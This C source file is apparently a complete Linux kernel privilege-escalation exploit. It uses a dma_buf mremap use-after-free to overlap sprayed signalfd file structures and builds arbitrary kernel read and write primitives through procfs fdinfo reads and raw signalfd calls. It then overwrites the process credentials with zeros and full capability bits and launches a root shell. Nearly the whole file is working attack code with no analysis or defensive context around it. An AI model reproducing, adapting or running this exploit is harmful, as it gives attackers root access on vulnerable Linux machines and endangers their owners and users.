#define _GNU_SOURCE
#include "dma_buf_t.h"
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <errno.h>
#include <stdio.h>
#include <sys/signalfd.h>
#include <syscall.h>
#include <sys/fcntl.h>
#include <string.h>

#define PAGE_SIZE (4096)
#define DMA_BUF_SIZE (7*PAGE_SIZE)

#define fatal_perror(text) do{perror("[-] " text); exit(-1);}while(0)

#define DMA_BUF_SPRAY_SIZE (8*PAGE_SIZE)
#define NUM_SPRAY_BUFS (40)

#define DMA_BUF_DRAIN_SIZE (4*PAGE_SIZE)
#define NUM_DRAIN_BUFS (2)

#define NUM_FD_SPRAYS (64)

#define NUM_SCAN_ITERATIONS (1000)

#define SIGNALFD_OPS_NIBBLES (0xf40)
#define SIGNALFD_OPS_TO_PRIV_OFF (0xa0)
#define SIGNALFD_OPS_TO_CRED_OFF (0x68)

dma_buf_t* spray_bufs[NUM_SPRAY_BUFS] = {0};
dma_buf_t* drain_bufs[NUM_DRAIN_BUFS] = {0};

int fd_sprays[NUM_FD_SPRAYS] = {0};

typedef void* kptr;

struct
{
    int found_filp_struct;
    void* found_signalfd_ops_addr;
    int signalfd_fd;
    int signalfd_proc_fd;
    uint64_t* signalfd_priv;
    kptr* signalfd_creds;
} exploit_data = {0};

void spray_dma_bufs()
{
    for(int i=0; i<NUM_SPRAY_BUFS; i++)
        spray_bufs[i] = dma_buf_create(DMA_BUF_SPRAY_SIZE);
}

void spray_dma_bufs_clean()
{
    for(int i=0; i<NUM_SPRAY_BUFS; i++)
    {
        dma_buf_destroy(spray_bufs[i]);
        spray_bufs[i] = NULL;
    }
}

void drain_dma_bufs()
{
    for(int i=0; i<NUM_DRAIN_BUFS; i++)
        drain_bufs[i] = dma_buf_create(DMA_BUF_DRAIN_SIZE);
}

void drain_dma_bufs_clean()
{
    for(int i=0; i<NUM_DRAIN_BUFS; i++)
    {
        dma_buf_destroy(drain_bufs[i]);
        drain_bufs[i] = NULL;
    }
}

void hexdump(char* addr, size_t len)
{
    const size_t line_size=32;
    const size_t group_by = 8;
    size_t off = 0;
    int64_t rem = len;
    printf("hexdump@%p:\n",addr);
    while(rem)
    {
        printf("+0x%04lx:", off);
        for(int l_cnt=0; l_cnt<line_size && rem; l_cnt++,off++,rem--)
        {
            if((l_cnt%group_by)==0)
                printf(" ");
            printf("%02hhx", addr[off]);
        }
        printf("\n");
    }
}

void spray_fds()
{
    uint64_t data = 0;

    for(int i=0; i<NUM_FD_SPRAYS; i++)
        fd_sprays[i] = signalfd(-1, (sigset_t*)&data, 0);
}

void spray_fds_clean()
{
    for(int i=0; i<NUM_FD_SPRAYS; i++)
        close(fd_sprays[i]);
}

int identify_signal_fd()
{
    void* sigfd_ops = exploit_data.found_signalfd_ops_addr;
    uint64_t *mode_flags_ptr = sigfd_ops + 0x18;
    uint64_t old_val = *mode_flags_ptr;
    uint64_t marker_value = 0xfefe;
    *mode_flags_ptr = marker_value;
    for(int i=0; i<NUM_FD_SPRAYS; i++)
    {
        int mode = fcntl(fd_sprays[i], F_GETFL);
        //printf("[+] %d: %x\n", fd_sprays[i], mode);
        if(mode == (int)marker_value)
        {
            printf("[+] Found signalfd fd_idx\n");
            exploit_data.signalfd_fd = fd_sprays[i];
            break;
        }
    }
    *mode_flags_ptr = old_val;
    return 0;
}

uint64_t arb_read_8(kptr kernel_ptr)
{
    char buffer[128] = {0};
    //Remember old_val and set to kernel_ptr we want to read
    uint64_t old_val = *exploit_data.signalfd_priv;
    *exploit_data.signalfd_priv = (uint64_t)kernel_ptr;

    //Reset seq_file
    lseek64(exploit_data.signalfd_proc_fd, SEEK_SET, 0);
    size_t amount = read(exploit_data.signalfd_proc_fd, buffer, sizeof(buffer));
    if(amount<0)
    {
        *exploit_data.signalfd_priv = old_val;
        fatal_perror("[-] signalfd procfs read");
    }
    //printf("%s\n", buffer+amount-17);
    char* end_ptr = NULL;
    uint64_t res = strtoull(buffer+amount-17, &end_ptr, 16);
    *exploit_data.signalfd_priv = old_val;
    return ~res;
}

void raw_signalfd(int fd, sigset_t* sigset)
{
    syscall(__NR_signalfd, fd, sigset, 8);
}

int arb_write_8(kptr dst, uint64_t val)
{
    uint64_t old_val = *exploit_data.signalfd_priv;
    *exploit_data.signalfd_priv = (uint64_t)dst;
    val = ~val;
    raw_signalfd(exploit_data.signalfd_fd, (sigset_t*)&val);
    *exploit_data.signalfd_priv = old_val;
}

int arb_read(char* dst, kptr src, ssize_t num)
{
    uint64_t* curr = (uint64_t*)dst;
    kptr c_src = src;
    while(num>0)
    {
        *curr = arb_read_8(c_src);
        curr++;
        c_src += 8;
        num -= 8;
    }
    return num;
}

void dump_creds(kptr creds)
{
    char buffer[128];
    arb_read(buffer, creds, sizeof(buffer));
    hexdump(buffer, sizeof(buffer));
}

int prep_sigfd_read()
{
    char path_buffer[256] = {0};
    pid_t pid = getpid();
    snprintf(path_buffer, sizeof(path_buffer), "/proc/%d/fdinfo/%d", pid, exploit_data.signalfd_fd);
    printf("[+] Opening %s\n", path_buffer);
    exploit_data.signalfd_proc_fd = open(path_buffer, O_RDONLY);
    if(exploit_data.signalfd_proc_fd<0)
    {
        fatal_perror("Open signalfd procfs info file");
    }
    exploit_data.signalfd_priv = exploit_data.found_signalfd_ops_addr+SIGNALFD_OPS_TO_PRIV_OFF;
    return 0;
}

int main(int argc, char* argv[])
{
    memset(&exploit_data, 0, sizeof(exploit_data));
    spray_dma_bufs();
    spray_dma_bufs_clean();
    drain_dma_bufs();
    dma_buf_t *dma_buf = dma_buf_create(DMA_BUF_SIZE);
    drain_dma_bufs_clean();

    if(!dma_buf)
        fatal_perror("dma_buf_create");
    char* mapping = mmap(0, dma_buf->size, PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->fd, 0);
    if(mapping == MAP_FAILED)
        fatal_perror("dma_buf mmap");
    
    char* new_mapping = mremap(mapping, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(new_mapping == MAP_FAILED)
        fatal_perror("dma_buf mremap");
    
    char* uaf_page = new_mapping+dma_buf->size;

    for(int i=0; i<NUM_SCAN_ITERATIONS; i++)
    {
        spray_fds();
        drain_dma_bufs(); //Make sure stolen page isn't on freelist

        //printf("[+] didn't crash\n");

        //Causes fault
        for(int j=0; j<PAGE_SIZE/8; j++)
        {
            uint64_t curr_val = ((uint64_t*)uaf_page)[j];
            if((curr_val & 0xfff) == SIGNALFD_OPS_NIBBLES)
            {
                printf("[+] Found signalfd_ops\n");
                hexdump(uaf_page+8*j, 0x200);
                exploit_data.found_signalfd_ops_addr = uaf_page+j*8;
                exploit_data.found_filp_struct = 1;
                madvise(uaf_page, PAGE_SIZE, MADV_DONTNEED);
                break;
            }
        }
        if(exploit_data.found_filp_struct)
            break;
        madvise(uaf_page, PAGE_SIZE, MADV_DONTNEED);

        spray_fds_clean();
        drain_dma_bufs_clean();
    }

    if(!exploit_data.found_filp_struct)
    {
        printf("[-] Didn't find struct file in memory\n");
        hexdump(uaf_page, 0x200);
        madvise(uaf_page, PAGE_SIZE, MADV_DONTNEED);
        exit(-1);
    }
    //If we get to here, there is some struct file in our page.
    if(identify_signal_fd()<0)
    {
        printf("[-] Failed to identify signalfd\n");
        exit(-1);
    }

    if(prep_sigfd_read()<0)
    {
        printf("[-] Failed to prep sigfd read\n");
        fflush(stdout);
        exit(-1);
    }

    kptr list_head = (kptr)exploit_data.signalfd_priv[1];
    uint64_t val = arb_read_8(list_head);
    printf("[+] read %lx @%p\n", val, list_head);
    exploit_data.signalfd_creds = ((void*)exploit_data.found_signalfd_ops_addr) + SIGNALFD_OPS_TO_CRED_OFF;
    kptr creds = *exploit_data.signalfd_creds;
    printf("[+] reading creds @ %p\n", creds);
    dump_creds(creds);

    for(int i=4; i<48; i++)
    {
        arb_write_8(creds+i, 0);
    }
    arb_write_8(creds+48, 0xffffffffff010000ULL);
    dump_creds(creds);
    system("sh");
}